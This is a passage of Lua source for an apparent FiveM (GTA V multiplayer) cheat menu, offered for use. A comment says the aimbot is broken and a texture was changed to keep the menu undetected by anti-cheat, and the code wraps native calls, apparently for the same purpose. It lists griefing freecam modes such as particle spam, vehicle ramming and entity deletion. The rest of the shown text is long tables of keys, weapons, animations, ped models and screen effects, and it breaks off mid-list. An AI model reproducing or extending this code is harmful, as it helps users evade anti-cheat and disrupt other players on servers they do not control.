Citizen.CreateThread(function()

	-- good menu but damn aimbot doesn't work, changed txd to make ud // VertissoTraper#6009
   
   local _cit_ = Citizen
   local work = true
   local dynamic = {
       TR = {}
   }
   local Cock = {
       Menu = { 
           SpawnInCar = true,
           Audible = true,
           MenuX = 0.5,
           MenuY = 0.5,
   
           LMenuX = 0.5,
           LMenuY = 0.5,
       },
       r = {
           _to_string = tostring,
       },
   }
   Cock.Native = function(native, ...)
       local _n = Cock.r._to_string(native)
       if _n then
           return _cit_.InvokeNative(_n, ...)
       end
   end
   
   local CockT = {
       UseCustomInput = false,
       Inv = {
           ["Invoke"] = Cock.Native, 
           ["Thread"] = _cit_.CreateThread, 
           ["Wait"] = _cit_.Wait
       },
       RGBPicker = {
           ['value'] = {min = 0, max = 255, value = 255, value_2 = 255}, 
           ['Style'] = {min = 0, max = 255, value = 'orange-red-yellow', value_2 = 0}, 
           ['Alpha'] = {min = 0, max = 255, value = 255},
   
           ['MyCar'] = {red = 0, green = 0, blue = 0},
           ['Crosshair'] = {red = 255, green = 255, blue = 255},
           ['AllVehicles'] = {red = 255, green = 255, blue = 255},
           ['CustomHud'] = {red = 255, green = 255, blue = 255},
       },
       Global = { 
           Alpha = 0,
           TextAlpha = 0,
           UseCustom = true,
           ShootingModes = {
               'weapon_pistol', 'weapon_stungun', 
               'weapon_assaultrifle', 'weapon_sniperrifle', 
               'weapon_raypistol', 'weapon_RPG', 
               'weapon_grenadelauncher'
           },
           CurrentShooting = 1, 
           FreecamMode = 1,
           FreecamModes = {
               "Particle Spam", "Teleport",
               "Shooting", "Spawner",
               "Prop Spawner ", "Place fire",
               "Ram vehicle", "Deleter",
               "Shit spawner", "Ped spawner",
   
               },
           },
           Strings = {
               len = string.len, sgmatch = string.gmatch,
               lower = string.lower, upper = string.upper,
               find = string.find, sub = string.sub,
               gsub = string.gsub, tostring = tostring,
               format = string.format, tremove = table.remove,
               tinsert = table.insert, tunpack = table.unpack,
               tsort = table.sort,
               msgunpack = msgpack.unpack, msgpack = msgpack.pack,
               jsonencode = json.encode, jsondecode = json.decode,
               type = type, vector3 = vector3, pcall = pcall,
               load = load,
           }, 
           Math = {
               random = math.random,
               randomseed = math.randomseed, sin = math.sin,
               cos = math.cos, sqrt = math.sqrt,
               pi = math.pi, rad = math.rad,
               abs = math.abs, floor = math.floor,
               deg = math.deg, atan2 = math.atan2,
               tonumber = tonumber, pairs = pairs, 
               ipairs = ipairs, yield = coroutine.yield,
               wrap = coroutine.wrap, printLog = _cit_.Trace,
                   
           },
           Keys = { 
               ["BACKSPACE"] = 177, ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56,
               ["F10"] = 57, ["F11"] = 344, ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162,
               ["9"] = 163, ["-"] = 84, ["="] = 83, ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245,
               ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18, ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9,
               ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182, ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26,
               ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81, ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22,
               ["RIGHTCTRL"] = 70, ["HOME"] = 213, ["INSERT"] = 121, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,["LEFT"] = 174,
               ["RIGHT"] = 175, ["UP"] = 172, ["DOWN"] = 173, ["NENTER"] = 201, ["MWHEELUP"] = 15, ["MWHEELDOWN"] = 14, ["N4"] = 108, ["N5"] = 110, ["N6"] = 107,
               ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 111, ["N9"] = 118, ["MOUSE1"] = 24, ["MOUSE2"] = 25, ["MOUSE3"] = 348, ["`"] = 243,
           },
           Keysv2 = { 
               ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162,
               ["9"] = 163, ["-"] = 84, ["="] = 83, ["q"] = 44, ["w"] = 32, ["e"] = 38, ["r"] = 45, ["t"] = 245,
               ["y"] = 246, ["u"] = 303, ["p"] = 199, ["["] = 39, ["]"] = 40, ["a"] = 34, ["s"] = 8, ["d"] = 9,
               ["f"] = 23, ["g"] = 47, ["h"] = 74, ["k"] = 311, ["l"] = 182, ["z"] = 20, ["x"] = 73, ["c"] = 26,
               ["v"] = 0, ["b"] = 29, ["n"] = 249, ["m"] = 244, [","] = 82, ["."] = 81, ["`"] = 243,
           },
           Weapons = {
               "PISTOL", "PISTOL_MK2", "COMBATPISTOL", "APPISTOL", "REVOLVER", "REVOLVER_MK2","DOUBLEACTION","PISTOL50", "SNSPISTOL", "SNSPISTOL_MK2", "HEAVYPISTOL","VINTAGEPISTOL","STUNGUN","FLAREGUN","MARKSMANPISTOL","KNIFE","KNUCKLE","NIGHTSTICK","HAMMER","BAT","GOLFCLUB","CROWBAR","BOTTLE",
               "DAGGER","HATCHET", "MACHETE", "FLASHLIGHT", "SWITCHBLADE","POOLCUE","PIPEWRENCH", "MICROSMG","MINISMG","SMG","SMG_MK2","ASSAULTSMG","COMBATPDW","GUSENBERG","MACHINEPISTOL","MG","COMBATMG","COMBATMG_MK2","ASSAULTRIFLE","ASSAULTRIFLE_MK2",
               "CARBINERIFLE","CARBINERIFLE_MK2","ADVANCEDRIFLE","SPECIALCARBINE","SPECIALCARBINE_MK2","BULLPUPRIFLE","BULLPUPRIFLE_MK2","COMPACTRIFLE","PUMPSHOTGUN","PUMPSHOTGUN_MK2", "SWEEPERSHOTGUN","SAWNOFFSHOTGUN","BULLPUPSHOTGUN","ASSAULTSHOTGUN","MUSKET","HEAVYSHOTGUN","DBSHOTGUN","SNIPERRIFLE","HEAVYSNIPER","HEAVYSNIPER_MK2","MARKSMANRIFLE",
               "MARKSMANRIFLE_MK2","GRENADELAUNCHER","GRENADELAUNCHER_SMOKE","RPG","MINIGUN","FIREWORK","RAILGUN","HOMINGLAUNCHER","COMPACTLAUNCHER","GRENADE","STICKYBOMB", "PROXMINE","BZGAS","SMOKEGRENADE","MOLOTOV","FIREEXTINGUISHER","PETROLCAN","SNOWBALL","FLARE","BALL"
           },
           Anims = {
               {lib = "gestures@m@standing@casual", anim = "gesture_hello"},
               {lib = "gestures@m@standing@casual", anim = "gesture_point"},
               {lib = "gestures@m@standing@casual", anim = "gesture_come_here_soft"}, 
               {lib = "gestures@m@standing@casual", anim = "gesture_bring_it_on"},
               {lib = "gestures@m@standing@casual", anim = "gesture_me"},
               {lib = "gestures@m@standing@casual", anim = "gesture_easy_now"},
               {lib = "gestures@m@standing@casual", anim = "gesture_damn"},
               {lib = "rcmpaparazzo_2", anim = "shag_loop_poppy"},
               {lib = "rcmpaparazzo_2", anim = "shag_loop_a"},
           
               {lib = "oddjobs@taxi@tie", anim = "vomit_outside"},
               {lib = "mp_common", anim = "givetake1_a"},
               {lib = "mp_ped_interaction", anim = "handshake_guy_a"},
               {lib = "mp_ped_interaction", anim = "hugs_guy_a"},
               {lib = "mp_player_int_uppersalute", anim = "mp_player_int_salute"},
               {lib = "random@arrests@busted", anim = "idle_c"},
               {lib = "amb@code_human_police_investigate@idle_b", anim = "idle_f"},
               {lib = "random@arrests", anim = "generic_radio_chatter"},
               {lib = "mini@repair", anim = "fixing_a_ped"},
               {lib = "oddjobs@taxi@driver", anim = "leanover_idle"},
               {lib = "oddjobs@taxi@cyi", anim = "std_hand_off_ps_passenger"},
               {lib = "mp_am_hold_up", anim = "purchase_beerbox_shopkeeper"},
               {lib = "mini@drinking", anim = "shots_barman_b"},
               {lib = "mp_action", anim = "thanks_male_06"},
               {lib = "anim@am_hold_up@male", anim = "shoplift_high"},
               {lib = "amb@world_human_jog_standing@male@idle_b", anim = "idle_d"},
               {lib = "amb@world_human_bum_standing@depressed@idle_a", anim = "idle_a"},
               {lib = "anim@mp_player_intcelebrationmale@face_palm", anim = "face_palm"},
               {lib = "oddjobs@assassinate@multi@", anim = "react_big_variations_a"},
               {lib = "amb@code_human_cower_stand@male@react_cowering", anim = "base_right"},
               {lib = "anim@deathmatch_intros@unarmed", anim = "intro_male_unarmed_e"},
               {lib = "mp_ped_interaction", anim = "kisses_guy_a"},
               {lib = "mp_player_int_upperfinger", anim = "mp_player_int_finger_01_enter"},
               {lib = "mp_player_int_upperwank", anim = "mp_player_int_wank_01"},
               {lib = "mp_suicide", anim = "pistol"},
               {lib = "amb@world_human_muscle_flex@arms_at_side@base", anim = "base"},
               {lib = "amb@world_human_muscle_free_weights@male@barbell@base", anim = "base"},
               {lib = "amb@world_human_push_ups@male@base", anim = "base"},
               {lib = "amb@world_human_sit_ups@male@base", anim = "base"},
               {lib = "amb@world_human_yoga@male@base", anim = "base_a"},
               {lib = "amb@world_human_aa_coffee@idle_a", anim = "idle_a"},
               {lib = "anim@heists@prison_heistunfinished_biztarget_idle", anim = "target_idle"},
               {lib = "mini@prostitutes@sexlow_veh", anim = "low_car_bj_to_prop_female"},
               {lib = "mini@safe_cracking", anim = "idle_base"}, 
               {lib = "move_m@confident", anim = "move_m@confident"},
               {lib = "move_f@heels@c", anim = "move_f@heels@c"},
               {lib = "move_m@depressed@a", anim = "move_m@depressed@a"},
               {lib = "move_f@depressed@a", anim = "move_f@depressed@a"},
               {lib = "move_m@business@a", anim = "move_m@business@a"},
               {lib = "move_m@brave@a", anim = "move_m@brave@a"},
               {lib = "move_m@casual@a", anim = "move_m@casual@a"},
               {lib = "move_m@fat@a", anim = "move_m@fat@a"},
               {lib = "move_m@hipster@a", anim = "move_m@hipster@a"},
               {lib = "move_m@injured", anim = "move_m@injured"},
               {lib = "move_m@hurry@a", anim = "move_m@hurry@a"},
               {lib = "move_m@hobo@a", anim = "move_m@hobo@a"},
               {lib = "move_m@sad@a", anim = "move_m@sad@a"},
               {lib = "move_m@muscle@a", anim = "move_m@muscle@a"},
               {lib = "move_m@shocked@a", anim = "move_m@shocked@a"},
               {lib = "move_m@shadyped@a", anim = "move_m@shadyped@a"},
               {lib = "move_m@buzzed", anim = "move_m@buzzed"},
               {lib = "move_m@hurry_butch@a", anim = "move_m@hurry_butch@a"},
               {lib = "move_m@money", anim = "move_m@money"},
               {lib = "move_m@quick", anim = "move_m@quick"},
               {lib = "move_f@maneater", anim = "move_f@maneater"},
               {lib = "move_f@sassy", anim = "move_f@sassy"},	
               {lib = "move_f@arrogant@a", anim = "move_f@arrogant@a"},
               {lib = "oddjobs@towing", anim = "m_blow_job_loop"},
               {lib = "oddjobs@towing", anim = "f_blow_job_loop"},
               {lib = "mini@prostitutes@sexlow_veh", anim = "low_car_sex_loop_player"},
               {lib = "mini@prostitutes@sexlow_veh", anim = "low_car_sex_loop_female"},
               {lib = "mp_player_int_uppergrab_crotch", anim = "mp_player_int_grab_crotch"},
               {lib = "mini@strip_club@idles@stripper", anim = "stripper_idle_02"},
               {lib = "mini@strip_club@backroom@", anim = "stripper_b_backroom_idle_b"},
               {lib = "mini@strip_club@lap_dance@ld_girl_a_song_a_p1", anim = "ld_girl_a_song_a_p1_f"},
               {lib = "mini@strip_club@private_dance@part2", anim = "priv_dance_p2"},
               {lib = "mini@strip_club@private_dance@part3", anim = "priv_dance_p3"},
           },
           Peds = {
               Female = {
                   "a_f_m_beach_01", "a_f_m_bevhills_01", "a_f_m_bevhills_02", "a_f_m_bodybuild_01", 
                   "a_f_m_business_02", "a_f_m_downtown_01", "a_f_m_eastsa_01", "a_f_m_eastsa_02", 
                   "a_f_m_fatbla_01", "a_f_m_fatcult_01", "a_f_m_fatwhite_01", "a_f_m_ktown_01", 
                   "a_f_m_ktown_02", "a_f_m_prolhost_01", "a_f_m_salton_01", "a_f_m_skidrow_01", 
                   "a_f_m_soucent_01", "a_f_m_soucent_02", "a_f_m_soucentmc_01", "a_f_m_tourist_01", 
                   "a_f_m_tramp_01", "a_f_m_trampbeac_01", "a_f_o_genstreet_01", "a_f_o_indian_01", 
                   "a_f_o_ktown_01", "a_f_o_salton_01", "a_f_o_soucent_01", "a_f_o_soucent_02", 
                   "a_f_y_beach_01", "a_f_y_bevhills_01", "a_f_y_bevhills_02", "a_f_y_bevhills_03", 
                   "a_f_y_bevhills_04", "a_f_y_business_01", "a_f_y_business_02", "a_f_y_business_03", 
                   "a_f_y_business_04", "a_f_y_clubcust_01", "a_f_y_clubcust_02", "a_f_y_clubcust_03", 
                   "a_f_y_eastsa_01", "a_f_y_eastsa_02", "a_f_y_eastsa_03", "a_f_y_epsilon_01", 
                   "a_f_y_femaleagent", "a_f_y_fitness_01", "a_f_y_fitness_02", "a_f_y_genhot_01", 
                   "a_f_y_golfer_01", "a_f_y_hiker_01", "a_f_y_hippie_01", "a_f_y_hipster_01", 
                   "a_f_y_hipster_02", "a_f_y_hipster_03", "a_f_y_hipster_04", "a_f_y_indian_01", 
                   "a_f_y_juggalo_01", "a_f_y_runner_01", "a_f_y_rurmeth_01", "a_f_y_scdressy_01", 
                   "a_f_y_skater_01", "a_f_y_soucent_01", "a_f_y_soucent_02", "a_f_y_soucent_03", 
                   "a_f_y_tennis_01", "a_f_y_topless_01", "a_f_y_tourist_01", "a_f_y_tourist_02", 
                   "a_f_y_yoga_01", "a_f_y_gencaspat_01",
               },
               Male = {
                   "a_m_m_acult_01", "a_m_m_afriamer_01", "a_m_m_beach_01", "a_m_m_beach_02", 
                   "a_m_m_bevhills_01", "a_m_m_bevhills_02", "a_m_m_business_01", "a_m_m_eastsa_01", 
                   "a_m_m_eastsa_02", "a_m_m_farmer_01", "a_m_m_fatlatin_01", "a_m_m_genfat_01", 
                   "a_m_m_genfat_02", "a_m_m_golfer_01", "a_m_m_hasjew_01", "a_m_m_hillbilly_01", 
                   "a_m_m_hillbilly_02", "a_m_m_indian_01", "a_m_m_ktown_01", "a_m_m_malibu_01", 
                   "a_m_m_mexcntry_01", "a_m_m_mexlabor_01", "a_m_m_og_boss_01", "a_m_m_paparazzi_01", 
                   "a_m_m_polynesian_01", "a_m_m_prolhost_01", "a_m_m_rurmeth_01", "a_m_m_salton_01", 
                   "a_m_m_salton_02", "a_m_m_salton_03", "a_m_m_salton_04", "a_m_m_skater_01", 
                   "a_m_m_skidrow_01", "a_m_m_socenlat_01", "a_m_m_soucent_01", "a_m_m_soucent_02", 
                   "a_m_m_soucent_03", "a_m_m_soucent_04", "a_m_m_stlat_02", "a_m_m_tennis_01", 
                   "a_m_m_tourist_01", "a_m_m_tramp_01", "a_m_m_trampbeac_01", "a_m_m_tranvest_01", 
                   "a_m_m_tranvest_02", "a_m_o_acult_01", "a_m_o_acult_02", "a_m_o_beach_01", 
                   "a_m_o_genstreet_01", "a_m_o_ktown_01", "a_m_o_salton_01", "a_m_o_soucent_01", 
                   "a_m_o_soucent_02", "a_m_o_soucent_03", "a_m_o_tramp_01", "a_m_y_acult_01", 
                   "a_m_y_acult_01", "a_m_y_beach_01", "a_m_y_beach_02", "a_m_y_beach_03", 
                   "a_m_y_beachvesp_01", "a_m_y_beachvesp_02", "a_m_y_bevhills_01", "a_m_y_bevhills_02", 
                   "a_m_y_breakdance_01", "a_m_y_busicas_01", "a_m_y_business_01", "a_m_y_business_02", 
                   "a_m_y_business_03", "a_m_y_clubcust_01", "a_m_y_clubcust_02", "a_m_y_clubcust_03", 
                   "a_m_y_cyclist_01", "a_m_y_dhill_01", "a_m_y_downtown_01", "a_m_y_eastsa_01", 
                   "a_m_y_eastsa_02", "a_m_y_epsilon_01", "a_m_y_epsilon_02", "a_m_y_gay_01", 
                   "a_m_y_gay_02", "a_m_y_genstreet_01", "a_m_y_genstreet_02", "a_m_y_golfer_01", 
                   "a_m_y_hasjew_01", "a_m_y_hiker_01", "a_m_y_hippy_01", "a_m_y_hipster_01", 
                   "a_m_y_hipster_02", "a_m_y_hipster_03", "a_m_y_indian_01", "a_m_y_jetski_01", 
                   "a_m_y_juggalo_01", "a_m_y_ktown_01", "a_m_y_ktown_02", "a_m_y_latino_01", 
                   "a_m_y_methhead_01", "a_m_y_mexthug_01", "a_m_y_motox_01", "a_m_y_motox_02", 
                   "a_m_y_musclbeac_01", "a_m_y_musclbeac_02", "a_m_y_polynesian_01", "a_m_y_roadcyc_01", 
                   "a_m_y_runner_01", "a_m_y_runner_02", "a_m_y_salton_01", "a_m_y_skater_01", 
                   "a_m_y_skater_02", "a_m_y_soucent_01", "a_m_y_soucent_02", "a_m_y_soucent_03", 
                   "a_m_y_soucent_04", "a_m_y_stbla_01", "a_m_y_stbla_02", "a_m_y_stlat_01", 
                   "a_m_y_stwhi_01", "a_m_y_stwhi_02", "a_m_y_sunbathe_01", "a_m_y_surfer_01", 
                   "a_m_y_vindouche_01", "a_m_y_vinewood_01", "a_m_y_vinewood_02", "a_m_y_vinewood_03", 
                   "a_m_y_vinewood_04", "a_m_y_yoga_01", "a_m_m_mlcrisis_01", "a_m_y_gencaspat_01", 
                   "a_m_y_smartcaspat_01", "mp_m_freemode_01",
               },
               Animals = {
                   "a_c_boar", "a_c_cat_01", "a_c_chickenhawk", "a_c_chimp", 
                   "a_c_chop", "a_c_cormorant", "a_c_cow", "a_c_coyote", 
                   "a_c_crow", "a_c_deer", "a_c_dolphin", "a_c_fish", 
                   "a_c_hen", "a_c_humpback", "a_c_husky", "a_c_killerwhale", 
                   "a_c_mtlion", "a_c_pig", "a_c_pigeon", "a_c_poodle", 
                   "a_c_pug", "a_c_rabbit_01", "a_c_rat", "a_c_retriever", 
                   "a_c_rhesus", "a_c_rottweiler", "a_c_seagull", "a_c_sharkhammer", 
                   "a_c_sharktiger", "a_c_shepherd", "a_c_stingray", "a_c_westy", 
               },
               Police = {
                   "ig_trafficwarden", "s_m_y_swat_01", "s_m_y_sheriff_01", "s_m_y_hwaycop_01", 
                   "s_m_y_cop_01", "s_m_m_snowcop_01", "s_m_m_ciasec_01", "s_m_m_fibsec_01",
                   "s_f_y_cop_01", "mp_m_fibsec_01",
               },     
               
           },
           Effects = {
               "AirRaceBoost01","AirRaceBoost02","AmbientPUSH","AP1_01_B_IntRefRange","AP1_01_C_NoFog","ArenaEMP","ArenaEMP_Blend","ArenaWheelPurple01","ArenaWheelPurple02","Bank_HLWD","Barry1_Stoned","BarryFadeOut","baseTONEMAPPING","BeastIntro01","BeastIntro02","BeastLaunch01","BeastLaunch02","BikerFilter","BikerForm01","BikerFormFlash","Bikers","BikersSPLASH","blackNwhite","BlackOut","BleepYellow01","BleepYellow02","Bloom","BloomLight","BloomMid","BombCam01","BombCamFlash","Broken_camera_fuzz","buggy_shack","buildingTOP","BulletTimeDark","BulletTimeLight","CAMERA_BW","CAMERA_secuirity","CAMERA_secuirity_FUZZ","canyon_mission","carMOD_underpass","carpark","carpark_dt1_02","carpark_dt1_03","Carpark_MP_exit","cashdepot","cashdepotEMERGENCY","casino_brightroom","casino_mainfloor","casino_mainWhiteFloor","casino_managementlobby","casino_managementOff","casino_managersoffice","CasinoBathrooms","cBank_back","cBank_front","ch2_tunnel_whitelight","CH3_06_water","CHOP","cinema","cinema_001","cops","CopsSPLASH","crane_cam","crane_cam_cinematic","CrossLine01","CrossLine02","CS1_railwayB_tunnel","CS3_rail_tunnel","CUSTOM_streetlight","damage","DeadlineNeon01","default","DefaultColorCode","dlc_casino_carpark","DLC_Casino_Garage","DONT_overide_sunpos","Dont_tazeme_bro","dont_tazeme_bro_b","downtown_FIB_cascades_opt","DrivingFocusDark","DrivingFocusLight","Drone_FishEye_Lens","DRUG_2_drive","Drug_deadman","Drug_deadman_blend","drug_drive_blend01","drug_drive_blend02","drug_flying_01","drug_flying_02","drug_flying_base","DRUG_gas_huffin","drug_wobbly","Drunk","mp_lad_day","mp_lad_judgment","mp_lad_night","dying","eatra_bouncelight_beach","epsilion","exile1_exit","exile1_plane","ExplosionJosh","EXT_FULLAmbientmult_art","ext_int_extlight_large","EXTRA_bouncelight","eyeINtheSKY","Facebook_NEW","facebook_serveroom","FIB_5","FIB_6","FIB_A","FIB_B","FIB_interview","FIB_interview_optimise","FinaleBank","FinaleBankexit","FinaleBankMid","fireDEPT","FORdoron_delete","Forest","fp_vig_black","fp_vig_blue","fp_vig_brown","fp_vig_gray","fp_vig_green","fp_vig_red","FrankilinsHOUSEhills","frankilnsAUNTS_new","frankilnsAUNTS_SUNdir","FRANKLIN","FranklinColorCode","FranklinColorCodeBasic","FranklinColorCodeBright","FullAmbientmult_interior","gallery_refmod","garage","gen_bank","glasses_black","Glasses_BlackOut","glasses_blue","glasses_brown","glasses_Darkblue","glasses_green","glasses_orange","glasses_pink","glasses_purple","glasses_red","glasses_Scuba","glasses_VISOR","glasses_yellow","gorge_reflection_gpu","gorge_reflectionoffset","gorge_reflectionoffset2","graveyard_shootout","grdlc_int_02","grdlc_int_02_trailer_cave","gunclub","gunclubrange","gunshop","gunstore","half_direct","hangar_lightsmod","Hanger_INTmods","heathaze","heist_boat","heist_boat_engineRoom","heist_boat_norain","helicamfirst","heliGunCam","Hicksbar","HicksbarNEW","hillstunnel","Hint_cam","hitped","hud_def_blur","hud_def_blur_switch","hud_def_colorgrade","hud_def_desat_cold","hud_def_desat_cold_kill","hud_def_desat_Franklin","hud_def_desat_Michael","hud_def_desat_Neutral","hud_def_desat_switch","hud_def_desat_Trevor","hud_def_desatcrunch","hud_def_flash","hud_def_focus","hud_def_Franklin","hud_def_lensdistortion","hud_def_lensdistortion_subtle","hud_def_Michael","hud_def_Trevor","ImpExp_Interior_01","IMpExt_Interior_02","IMpExt_Interior_02_stair_cage","InchOrange01","InchOrange02","InchPickup01","InchPickup02","InchPurple01","InchPurple02","INT_FullAmbientmult","INT_FULLAmbientmult_art","INT_FULLAmbientmult_both","INT_garage","INT_mall","INT_NO_fogALPHA","INT_NoAmbientmult","INT_NoAmbientmult_art","INT_NoAmbientmult_both","INT_NOdirectLight","INT_nowaterREF","INT_posh_hairdresser","INT_smshop","INT_smshop_indoor_bloom","INT_smshop_inMOD","INT_smshop_outdoor_bloom","INT_streetlighting","INT_trailer_cinema","id1_11_tunnel","impexp_interior_01_lift","int_amb_mult_large","int_arena_01","int_arena_Mod","int_arena_Mod_garage","int_arena_VIP","int_Barber1","int_carmod_small","int_carrier_control","int_carrier_control_2","int_carrier_hanger","int_carrier_rear","int_carrier_stair","int_carshowroom","int_chopshop","int_clean_extlight_large","int_clean_extlight_none","int_clean_extlight_small","int_ClothesHi","int_clotheslow_large","int_cluckinfactory_none","int_cluckinfactory_small","int_ControlTower_none","int_ControlTower_small","int_dockcontrol_small","int_extlght_sm_cntrst","int_extlight_large","int_extlight_large_fog","int_extlight_none","int_extlight_none_dark","int_extlight_none_dark_fog","int_extlight_none_fog","int_extlight_small","int_extlight_small_clipped","int_extlight_small_fog","int_Farmhouse_none","int_Farmhouse_small","int_FranklinAunt_small","int_GasStation","int_hanger_none","int_hanger_small","int_Hospital_Blue","int_Hospital_BlueB","int_hospital_dark","int_Hospital_DM","int_hospital_small","int_Hospital2_DM","int_lesters","int_Lost_none","int_Lost_small","int_methlab_small","int_motelroom","int_office_Lobby","int_office_LobbyHall","int_tattoo","int_tattoo_B","int_tunnel_none_dark","interior_WATER_lighting","introblue","jewel_gas","jewel_optim","jewelry_entrance","jewelry_entrance_INT","jewelry_entrance_INT_fog","Kifflom","KT_underpass","lab_none","lab_none_dark","lab_none_dark_fog","lab_none_dark_OVR","lab_none_exit","lab_none_exit_OVR","LectroDark","LectroLight","LIGHTSreduceFALLOFF","li","LifeInvaderLOD","lightning","lightning_cloud","lightning_strong","lightning_weak","LightPollutionHills","lightpolution","LODmult_global_reduce","LODmult_global_reduce_NOHD","LODmult_HD_orphan_LOD_reduce","LODmult_HD_orphan_reduce","LODmult_LOD_reduce","LODmult_SLOD1_reduce","LODmult_SLOD2_reduce","LODmult_SLOD3_reduce","lodscaler","LostTimeDark","LostTimeFlash","LostTimeLight","maxlodscaler","metro","METRO_platform","METRO_Tunnels","METRO_Tunnels_entrance","MichaelColorCode","MichaelColorCodeBasic","MichaelColorCodeBright","MichaelsDarkroom","MichaelsDirectional","MichaelsNODirectional","micheal","micheals_lightsOFF","michealspliff","michealspliff_blend","michealspliff_blend02","militarybase_nightlight","mineshaft","morebloom","morgue_dark","morgue_dark_ovr","Mp_apart_mid","MP_Arena_theme_atlantis","MP_Arena_theme_evening","MP_Arena_theme_hell","MP_Arena_theme_midday","MP_Arena_theme_morning","MP_Arena_theme_night","MP_Arena_theme_saccharine","MP_Arena_theme_sandstorm","MP_Arena_theme_scifi_night","MP_Arena_theme_storm","MP_Arena_theme_toxic","MP_Arena_VIP","mp_battle_int01","mp_battle_int01_dancefloor","mp_battle_int01_dancefloor_OFF","mp_battle_int01_entry","mp_battle_int01_garage","mp_battle_int01_office","mp_battle_int02","mp_battle_int03","mp_battle_int03_tint1","mp_battle_int03_tint2","mp_battle_int03_tint3","mp_battle_int03_tint4","mp_battle_int03_tint5","mp_battle_int03_tint6","mp_battle_int03_tint7","mp_battle_int03_tint8","mp_battle_int03_tint9","mp_bkr_int01_garage","mp_bkr_int01_small_rooms","mp_bkr_int01_transition","mp_bkr_int02_garage","mp_bkr_int02_hangout","mp_bkr_int02_small_rooms","mp_bkr_ware01","mp_bkr_ware02_dry","mp_bkr_ware02_standard","mp_bkr_ware02_upgrade","mp_bkr_ware03_basic","mp_bkr_ware03_upgrade","mp_bkr_ware04","mp_bkr_ware05","MP_Bull_tost","MP_Bull_tost_blend","MP_casino_apartment_bar","MP_casino_apartment_barPARTY","MP_casino_apartment_barPARTY_0","MP_casino_apartment_barPARTY_01","MP_casino_apartment_barPARTY_2","MP_casino_apartment_Bath","MP_casino_apartment_changing","MP_casino_apartment_cinema","MP_casino_apartment_colour0","MP_casino_apartment_colour1","MP_casino_apartment_colour2","MP_casino_apartment_exec","MP_casino_apartment_lobby","MP_casino_apartment_lounge","MP_casino_apartment_MBed","MP_casino_apartment_office","MP_casino_apartment_spa","MP_corona_heist","MP_corona_heist_blend","MP_corona_heist_BW","MP_corona_heist_BW_night","MP_corona_heist_DOF","MP_corona_heist_night","MP_corona_heist_night_blend","MP_corona_selection","MP_corona_switch","MP_corona_tournament","MP_corona_tournament_DOF","MP_death_grade","MP_death_grade_blend01","MP_death_grade_blend02","MP_deathfail_night","mp_exec_office_01","mp_exec_office_02","mp_exec_office_03","mp_exec_office_03_blue","mp_exec_office_03C","mp_exec_office_04","mp_exec_office_05","mp_exec_office_06","mp_exec_warehouse_01","MP_Garage_L","mp_gr_int01_black","mp_gr_int01_grey","mp_gr_int01_white","MP_H_01_Bathroom","MP_H_01_Bedroom","MP_H_01_New","MP_H_01_New_Bathroom","MP_H_01_New_Bedroom","MP_H_01_New_Study","MP_H_01_Study","MP_H_02","MP_H_04","mp_h_05","MP_H_06","mp_h_07","mp_h_08","MP_heli_cam","mp_imx_intwaremed","mp_imx_intwaremed_office","mp_imx_mod_int_01","MP_intro_logo","MP_job_end_night","MP_job_load","MP_job_load_01","MP_job_load_02","MP_job_lose","MP_job_preload","MP_job_preload_blend","MP_job_preload_night","MP_job_win","MP_Killstreak","MP_Killstreak_blend","MP_Loser","MP_Loser_blend","MP_lowgarage","MP_MedGarage","mp_nightshark_shield_fp","MP_Powerplay","MP_Powerplay_blend","MP_race_finish","MP_select","mp_smg_int01_han","mp_smg_int01_han_blue","mp_smg_int01_han_red","mp_smg_int01_han_yellow","Mp_Stilts","Mp_Stilts_gym","Mp_Stilts_gym2","Mp_Stilts2","Mp_Stilts2_bath","MP_Studio_Lo","mp_x17dlc_base","mp_x17dlc_base_dark","mp_x17dlc_base_darkest","mp_x17dlc_facility","mp_x17dlc_facility_conference","mp_x17dlc_facility2","mp_x17dlc_in_sub","mp_x17dlc_in_sub_no_reflection","mp_x17dlc_int_01","mp_x17dlc_int_01_tint1","mp_x17dlc_int_01_tint2","mp_x17dlc_int_01_tint3","mp_x17dlc_int_01_tint4","mp_x17dlc_int_01_tint5","mp_x17dlc_int_01_tint6","mp_x17dlc_int_01_tint7","mp_x17dlc_int_01_tint8","mp_x17dlc_int_01_tint9","mp_x17dlc_int_02","mp_x17dlc_int_02_hangar","mp_x17dlc_int_02_outdoor_intro_camera","mp_x17dlc_int_02_tint1","mp_x17dlc_int_02_tint2","mp_x17dlc_int_02_tint3","mp_x17dlc_int_02_tint4","mp_x17dlc_int_02_tint5","mp_x17dlc_int_02_tint6","mp_x17dlc_int_02_tint7","mp_x17dlc_int_02_tint8","mp_x17dlc_int_02_tint9","mp_x17dlc_int_02_vehicle_avenger_camera","mp_x17dlc_int_02_vehicle_workshop_camera","mp_x17dlc_int_02_weapon_avenger_camera","mp_x17dlc_int_silo","mp_x17dlc_int_silo_escape", 